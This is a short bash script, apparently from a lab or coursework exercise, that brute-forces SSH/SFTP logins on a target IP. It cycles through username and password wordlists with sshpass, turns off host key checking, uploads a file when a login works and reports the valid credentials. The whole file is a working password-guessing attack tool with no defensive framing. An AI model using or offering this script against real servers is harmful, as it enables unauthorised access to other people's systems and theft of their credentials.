#!/bin/bash

# IP address of the SSH server
ip_addr=$1

# File containing usernames
USER_FILE="user.txt"

# File containing passwords
PASS_FILE="pass.txt"
# echo $SSH_HOST
path_of_local_file="/home/iiita/Desktop/main/terminal-task/final_test/ftp_file.txt"
i=0
connection_issue=1
while IFS= read -r username || [ -n "$username" ]; do
    while IFS= read -r password || [ -n "$password" ]; do
        i=$((i + 1))

        # Attempt to connect using the current combination of username and password
        sshpass -p "$password" sftp -oBatchMode=no -oStrictHostKeyChecking=no "$username@$ip_addr" <<< $"put $path_of_local_file" > /dev/null 2>&1
        exitStatus=$?

        # Check the exit code to determine if the connection was successful
        if [ "$exitStatus" -eq 0 ]; then
            echo "Success: Username = \"$username\", Password = \"$password\" | Attempt #$i"
            exit 0
        fi

        if [ "$exitStatus" -ne 255 ]; then
            connection_issue=0
        fi
    done < "$PASS_FILE"
done < "$USER_FILE"

# Report result
if [ "$connection_issue" -eq 1 ]; then
    echo "Connection Failure (Host unreachable or network error)"
else
    echo "No valid username/password combo found"
fi

exit 1